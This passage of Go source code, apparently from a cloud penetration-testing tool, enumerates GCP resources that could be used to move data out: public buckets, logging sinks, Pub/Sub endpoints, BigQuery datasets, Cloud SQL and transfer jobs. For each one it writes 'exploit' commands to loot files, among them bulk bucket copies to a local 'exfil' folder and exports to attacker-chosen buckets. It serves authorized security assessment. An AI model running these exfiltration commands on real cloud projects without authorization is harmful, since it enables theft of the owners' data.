						"# Download all files\n"+
						"gsutil -m cp -r gs://%s/ ./exfil/",
					bucket.Name, bucket.Name),
			}

			m.mu.Lock()
			m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findCrossProjectLoggingSinks finds REAL logging sinks that export to external destinations
func (m *DataExfiltrationModule) findCrossProjectLoggingSinks(ctx context.Context, projectID string, logger internal.Logger) {
	ls := loggingservice.New()
	sinks, err := ls.Sinks(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list logging sinks in project %s", projectID))
		return
	}

	for _, sink := range sinks {
		if sink.Disabled {
			continue
		}

		// Only report cross-project or external sinks
		if sink.IsCrossProject {
			riskLevel := "HIGH"
			if sink.DestinationType == "pubsub" {
				riskLevel = "MEDIUM" // Pub/Sub is often used for legitimate cross-project messaging
			}

			destDesc := fmt.Sprintf("%s in project %s", sink.DestinationType, sink.DestinationProject)

			path := ExfiltrationPath{
				PathType:     "Logging Sink",
				ResourceName: sink.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("Logs exported to %s", destDesc),
				Destination:  sink.Destination,
				RiskLevel:    riskLevel,
				RiskReasons:  []string{"Logs exported to different project", "May contain sensitive information in log entries"},
				ExploitCommand: fmt.Sprintf(
					"# View sink configuration\n"+
						"gcloud logging sinks describe %s --project=%s\n"+
						"# Check destination permissions\n"+
						"# Destination: %s",
					sink.Name, projectID, sink.Destination),
			}

			m.mu.Lock()
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findPubSubPushEndpoints finds Pub/Sub subscriptions pushing to external HTTP endpoints
func (m *DataExfiltrationModule) findPubSubPushEndpoints(ctx context.Context, projectID string, logger internal.Logger) {
	ps := pubsubservice.New()
	subs, err := ps.Subscriptions(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Pub/Sub subscriptions in project %s", projectID))
		return
	}

	for _, sub := range subs {
		if sub.PushEndpoint == "" {
			continue
		}

		// Check if endpoint is external (not run.app, cloudfunctions.net, or same project)
		endpoint := sub.PushEndpoint
		isExternal := true
		if strings.Contains(endpoint, ".run.app") ||
			strings.Contains(endpoint, ".cloudfunctions.net") ||
			strings.Contains(endpoint, "appspot.com") ||
			strings.Contains(endpoint, "googleapis.com") {
			isExternal = false
		}

		if isExternal {
			riskLevel := "HIGH"

			path := ExfiltrationPath{
				PathType:     "Pub/Sub Push",
				ResourceName: sub.Name,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("Subscription pushes messages to external endpoint"),
				Destination:  endpoint,
				RiskLevel:    riskLevel,
				RiskReasons:  []string{"Messages pushed to external HTTP endpoint", "Endpoint may be attacker-controlled"},
				ExploitCommand: fmt.Sprintf(
					"# View subscription configuration\n"+
						"gcloud pubsub subscriptions describe %s --project=%s\n"+
						"# Test endpoint\n"+
						"curl -v %s",
					sub.Name, projectID, endpoint),
			}

			m.mu.Lock()
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findPubSubExportSubscriptions finds Pub/Sub subscriptions exporting to BigQuery or GCS
func (m *DataExfiltrationModule) findPubSubExportSubscriptions(ctx context.Context, projectID string, logger internal.Logger) {
	ps := pubsubservice.New()
	subs, err := ps.Subscriptions(projectID)
	if err != nil {
		return
	}

	for _, sub := range subs {
		// Check for BigQuery export
		if sub.BigQueryTable != "" {
			// Extract project from table reference
			parts := strings.Split(sub.BigQueryTable, ".")
			if len(parts) >= 1 {
				destProject := parts[0]
				if destProject != projectID {
					path := ExfiltrationPath{
						PathType:     "Pub/Sub BigQuery Export",
						ResourceName: sub.Name,
						ProjectID:    projectID,
						Description:  "Subscription exports messages to BigQuery in different project",
						Destination:  sub.BigQueryTable,
						RiskLevel:    "MEDIUM",
						RiskReasons:  []string{"Messages exported to different project", "Data flows outside source project"},
						ExploitCommand: fmt.Sprintf(
							"gcloud pubsub subscriptions describe %s --project=%s",
							sub.Name, projectID),
					}

					m.mu.Lock()
					m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
					m.addExfiltrationPathToLoot(projectID, path)
					m.mu.Unlock()
				}
			}
		}

		// Check for Cloud Storage export
		if sub.CloudStorageBucket != "" {
			path := ExfiltrationPath{
				PathType:     "Pub/Sub GCS Export",
				ResourceName: sub.Name,
				ProjectID:    projectID,
				Description:  "Subscription exports messages to Cloud Storage bucket",
				Destination:  "gs://" + sub.CloudStorageBucket,
				RiskLevel:    "MEDIUM",
				RiskReasons:  []string{"Messages exported to Cloud Storage", "Bucket may be accessible externally"},
				ExploitCommand: fmt.Sprintf(
					"gcloud pubsub subscriptions describe %s --project=%s\n"+
						"gsutil ls gs://%s/",
					sub.Name, projectID, sub.CloudStorageBucket),
			}

			m.mu.Lock()
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findPublicBigQueryDatasets finds BigQuery datasets with public IAM bindings
func (m *DataExfiltrationModule) findPublicBigQueryDatasets(ctx context.Context, projectID string, logger internal.Logger) {
	bq := bigqueryservice.New()
	datasets, err := bq.BigqueryDatasets(projectID)
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list BigQuery datasets in project %s", projectID))
		return
	}

	for _, dataset := range datasets {
		// Check if dataset has public access (already computed by the service)
		if dataset.IsPublic {
			export := PublicExport{
				ResourceType: "BigQuery Dataset",
				ResourceName: dataset.DatasetID,
				ProjectID:    projectID,
				AccessLevel:  dataset.PublicAccess,
				DataType:     "bigquery_dataset",
				RiskLevel:    "CRITICAL",
			}

			path := ExfiltrationPath{
				PathType:     "Public BigQuery",
				ResourceName: dataset.DatasetID,
				ProjectID:    projectID,
				Description:  fmt.Sprintf("BigQuery dataset accessible to %s", dataset.PublicAccess),
				Destination:  "Anyone with access level: " + dataset.PublicAccess,
				RiskLevel:    "CRITICAL",
				RiskReasons:  []string{"Dataset is publicly accessible", "Data can be queried by anyone"},
				ExploitCommand: fmt.Sprintf(
					"# Query public dataset\n"+
						"bq query --use_legacy_sql=false 'SELECT * FROM `%s.%s.INFORMATION_SCHEMA.TABLES`'\n"+
						"# Export data\n"+
						"bq extract --destination_format=CSV '%s.%s.TABLE_NAME' gs://your-bucket/export.csv",
					projectID, dataset.DatasetID, projectID, dataset.DatasetID),
			}

			m.mu.Lock()
			m.ProjectPublicExports[projectID] = append(m.ProjectPublicExports[projectID], export)
			m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
			m.addExfiltrationPathToLoot(projectID, path)
			m.mu.Unlock()
		}
	}
}

// findCloudSQLExportConfig finds Cloud SQL instances with export configurations
func (m *DataExfiltrationModule) findCloudSQLExportConfig(ctx context.Context, projectID string, logger internal.Logger) {
	sqlService, err := sqladmin.NewService(ctx)
	if err != nil {
		return
	}

	resp, err := sqlService.Instances.List(projectID).Do()
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Cloud SQL instances in project %s", projectID))
		return
	}

	for _, instance := range resp.Items {
		// Check if instance has automated backups enabled with export to GCS
		if instance.Settings != nil && instance.Settings.BackupConfiguration != nil {
			backup := instance.Settings.BackupConfiguration
			if backup.Enabled && backup.BinaryLogEnabled {
				// Instance has binary logging - can export via CDC
				path := ExfiltrationPath{
					PathType:     "Cloud SQL Export",
					ResourceName: instance.Name,
					ProjectID:    projectID,
					Description:  "Cloud SQL instance with binary logging enabled (enables CDC export)",
					Destination:  "External via mysqldump/pg_dump or CDC",
					RiskLevel:    "LOW", // This is standard config, not necessarily a risk
					RiskReasons:  []string{"Binary logging enables change data capture", "Data can be exported if IAM allows"},
					ExploitCommand: fmt.Sprintf(
						"# Check export permissions\n"+
							"gcloud sql instances describe %s --project=%s\n"+
							"# Export if permitted\n"+
							"gcloud sql export sql %s gs://bucket/export.sql --database=mydb",
						instance.Name, projectID, instance.Name),
				}

				m.mu.Lock()
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
	}
}

// findStorageTransferJobs finds Storage Transfer Service jobs to external destinations
func (m *DataExfiltrationModule) findStorageTransferJobs(ctx context.Context, projectID string, logger internal.Logger) {
	stsService, err := storagetransfer.NewService(ctx)
	if err != nil {
		return
	}

	// List transfer jobs for this project - filter is a required parameter
	filter := fmt.Sprintf(`{"projectId":"%s"}`, projectID)
	req := stsService.TransferJobs.List(filter)
	err = req.Pages(ctx, func(page *storagetransfer.ListTransferJobsResponse) error {
		for _, job := range page.TransferJobs {
			if job.Status != "ENABLED" {
				continue
			}

			// Check for external destinations (AWS S3, Azure Blob, HTTP)
			var destination string
			var destType string
			var isExternal bool

			if job.TransferSpec != nil {
				if job.TransferSpec.AwsS3DataSource != nil {
					destination = fmt.Sprintf("s3://%s", job.TransferSpec.AwsS3DataSource.BucketName)
					destType = "AWS S3"
					isExternal = true
				}
				if job.TransferSpec.AzureBlobStorageDataSource != nil {
					destination = fmt.Sprintf("azure://%s/%s",
						job.TransferSpec.AzureBlobStorageDataSource.StorageAccount,
						job.TransferSpec.AzureBlobStorageDataSource.Container)
					destType = "Azure Blob"
					isExternal = true
				}
				if job.TransferSpec.HttpDataSource != nil {
					destination = job.TransferSpec.HttpDataSource.ListUrl
					destType = "HTTP"
					isExternal = true
				}
			}

			if isExternal {
				path := ExfiltrationPath{
					PathType:     "Storage Transfer",
					ResourceName: job.Name,
					ProjectID:    projectID,
					Description:  fmt.Sprintf("Transfer job to %s", destType),
					Destination:  destination,
					RiskLevel:    "HIGH",
					RiskReasons:  []string{"Data transferred to external cloud provider", "Destination outside GCP control"},
					ExploitCommand: fmt.Sprintf(
						"# View transfer job\n"+
							"gcloud transfer jobs describe %s",
						job.Name),
				}

				m.mu.Lock()
				m.ProjectExfiltrationPaths[projectID] = append(m.ProjectExfiltrationPaths[projectID], path)
				m.addExfiltrationPathToLoot(projectID, path)
				m.mu.Unlock()
			}
		}
		return nil
	})

	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not list Storage Transfer jobs for project %s", projectID))
	}
}


// findPermissionBasedExfilPaths identifies principals with data exfiltration permissions
// This uses the centralized attackpathService for project and resource-level analysis
func (m *DataExfiltrationModule) findPermissionBasedExfilPaths(ctx context.Context, projectID string, logger internal.Logger) {
	// Skip if we already loaded attack paths from cache
	if m.usedAttackPathCache {
		return
	}

	// Use attackpathService for project-level analysis
	attackSvc := attackpathservice.New()

	projectName := m.GetProjectName(projectID)
	paths, err := attackSvc.AnalyzeProjectAttackPaths(ctx, projectID, projectName, "exfil")
	if err != nil {
		gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
			fmt.Sprintf("Could not analyze exfil permissions for project %s", projectID))
		return
	}

	// Store paths directly (they're already AttackPath type)
	m.mu.Lock()
	m.ProjectAttackPaths[projectID] = append(m.ProjectAttackPaths[projectID], paths...)
	m.mu.Unlock()

	// Also analyze resource-level IAM
	resourcePaths, err := attackSvc.AnalyzeResourceAttackPaths(ctx, projectID, "exfil")
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_DATAEXFILTRATION_MODULE_NAME,
				fmt.Sprintf("Could not analyze resource-level exfil permissions for project %s", projectID))
		}
	} else {
		m.mu.Lock()
		m.ProjectAttackPaths[projectID] = append(m.ProjectAttackPaths[projectID], resourcePaths...)
		m.mu.Unlock()
	}
}

// ------------------------------
// Loot File Management
// ------------------------------
func (m *DataExfiltrationModule) addExfiltrationPathToLoot(projectID string, path ExfiltrationPath) {
	if path.ExploitCommand == "" {
		return
	}

	lootFile := m.LootMap[projectID]["data-exfiltration-commands"]
	if lootFile == nil {
		return
	}

	lootFile.Contents += fmt.Sprintf(
		"#############################################\n"+
			"## [ACTUAL] %s: %s\n"+
			"## Project: %s\n"+
			"## Description: %s\n"+
			"## Destination: %s\n"+
			"#############################################\n",
		path.PathType,
		path.ResourceName,
		path.ProjectID,
		path.Description,
		path.Destination,
	)

	lootFile.Contents += fmt.Sprintf("%s\n\n", path.ExploitCommand)
}


// ------------------------------
// Output Generation
// ------------------------------

func (m *DataExfiltrationModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if m.Hierarchy != nil && !m.FlatOutput {
		m.writeHierarchicalOutput(ctx, logger)
	} else {
		m.writeFlatOutput(ctx, logger)
	}
}

func (m *DataExfiltrationModule) getMisconfigHeader() []string {
	return []string{
		"Project",
		"Resource",
		"Type",
		"Destination",
		"Public",
		"Size",
	}
}

func (m *DataExfiltrationModule) getAttackPathsHeader() []string {
	return []string{
		"Project",
		"Source",
		"Principal Type",
		"Principal",
		"Method",
		"Target Resource",
		"Category",
		"Binding Scope",
		"Permissions",
	}
}

func (m *DataExfiltrationModule) pathsToTableBody(paths []ExfiltrationPath, exports []PublicExport) [][]string {
	var body [][]string

	// Track which resources we've added from PublicExports
	publicResources := make(map[string]PublicExport)
	for _, e := range exports {
		key := fmt.Sprintf("%s:%s:%s", e.ProjectID, e.ResourceType, e.ResourceName)
		publicResources[key] = e
	}

	// Add exfiltration paths (actual misconfigurations)
	for _, p := range paths {
		key := fmt.Sprintf("%s:%s:%s", p.ProjectID, p.PathType, p.ResourceName)
		export, isPublic := publicResources[key]

		publicStatus := "No"
		size := "-"
		if isPublic {
			publicStatus = "Yes"
			size = export.Size
			delete(publicResources, key)
		}

		body = append(body, []string{
			m.GetProjectName(p.ProjectID),
			p.ResourceName,
			p.PathType,
			p.Destination,
			publicStatus,
			size,
		})
	}

	// Add any remaining public exports not already covered
	for _, e := range publicResources {
		body = append(body, []string{
			m.GetProjectName(e.ProjectID),
			e.ResourceName,
			e.ResourceType,
			"Public access: " + e.AccessLevel,
			"Yes",
			e.Size,
		})
	}

	return body
}

func (m *DataExfiltrationModule) attackPathsToTableBody(paths []attackpathservice.AttackPath) [][]string {
	var body [][]string
	for _, p := range paths {
		// Format source (where permission was granted)
		source := p.ScopeName
		if source == "" {
			source = p.ScopeID
		}
		if p.ScopeType == "organization" {
			source = "org:" + source
		} else if p.ScopeType == "folder" {
			source = "folder:" + source
		} else if p.ScopeType == "resource" {
			source = "resource"
		} else {
			source = "project"
		}

		// Format target resource
		targetResource := p.TargetResource
		if targetResource == "" || targetResource == "*" {
			targetResource = "*"
		}

		// Format permissions
		permissions := strings.Join(p.Permissions, ", ")
		if permissions == "" {
			permissions = "-"
		}

		// Format binding scope (where the IAM binding is defined)
		bindingScope := "Project"
		if p.ScopeType == "organization" {
			bindingScope = "Organization"
		} else if p.ScopeType == "folder" {
			bindingScope = "Folder"
		} else if p.ScopeType == "resource" {
			bindingScope = "Resource"
		}

		body = append(body, []string{
			m.GetProjectName(p.ProjectID),
			source,
			p.PrincipalType,
			p.Principal,
			p.Method,
			targetResource,
			p.Category,
			bindingScope,
			permissions,
		})
	}
	return body
}

func (m *DataExfiltrationModule) buildTablesForProject(projectID string) []internal.TableFile {
	var tableFiles []internal.TableFile

	paths := m.ProjectExfiltrationPaths[projectID]
	exports := m.ProjectPublicExports[projectID]
	attackPaths := m.ProjectAttackPaths[projectID]

	if len(paths) > 0 || len(exports) > 0 {
		body := m.pathsToTableBody(paths, exports)
		if len(body) > 0 {
			tableFiles = append(tableFiles, internal.TableFile{
				Name:   "data-exfiltration-misconfigurations",
				Header: m.getMisconfigHeader(),
				Body:   body,
			})
		}
	}

	if len(attackPaths) > 0 {
		tableFiles = append(tableFiles, internal.TableFile{
			Name:   "data-exfiltration",
			Header: m.getAttackPathsHeader(),
			Body:   m.attackPathsToTableBody(attackPaths),
		})
	}

	return tableFiles
}

func (m *DataExfiltrationModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Collect all project IDs that have data
	projectIDs := make(map[string]bool)
	for projectID := range m.ProjectExfiltrationPaths {
		projectIDs[projectID] = true
	}
	for projectID := range m.ProjectPublicExports {
		projectIDs[projectID] = true
	}
	for projectID := range m.ProjectAttackPaths {
		projectIDs[projectID] = true
	}

	// Generate playbook once for all projects
	playbook := m.generatePlaybook()
	playbookAdded := false

	for projectID := range projectIDs {
		// Ensure loot is initialized
		m.initializeLootForProject(projectID)

		tableFiles := m.buildTablesForProject(projectID)

		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization!\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		// Add playbook to first project only (to avoid duplication)
		if playbook != nil && playbook.Contents != "" && !playbookAdded {
			lootFiles = append(lootFiles, *playbook)
			playbookAdded = true
		}

		outputData.ProjectLevelData[projectID] = DataExfiltrationOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), GCP_DATAEXFILTRATION_MODULE_NAME)
	}
}

func (m *DataExfiltrationModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	allPaths := m.getAllExfiltrationPaths()
	allExports := m.getAllPublicExports()
	allAttackPaths := m.getAllAttackPaths()

	// Initialize loot for projects
	for _, projectID := range m.ProjectIDs {
		m.initializeLootForProject(projectID)
	}

	// Build tables
	tables := []internal.TableFile{}

	misconfigBody := m.pathsToTableBody(allPaths, allExports)
	if len(misconfigBody) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "data-exfiltration-misconfigurations",
			Header: m.getMisconfigHeader(),
			Body:   misconfigBody,
		})
	}

	if len(allAttackPaths) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "data-exfiltration",
			Header: m.getAttackPathsHeader(),
			Body:   m.attackPathsToTableBody(allAttackPaths),
		})
	}

	// Collect loot files
	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# WARNING: Only use with proper authorization!\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	// Add playbook
	playbook := m.generatePlaybook()
	if playbook != nil && playbook.Contents != "" {
		lootFiles = append(lootFiles, *playbook)
	}

	output := DataExfiltrationOutput{
		Table: tables,
		Loot:  lootFiles,
	}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, projectID := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(projectID)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), GCP_DATAEXFILTRATION_MODULE_NAME)
		m.CommandCounter.Error++
	}
}
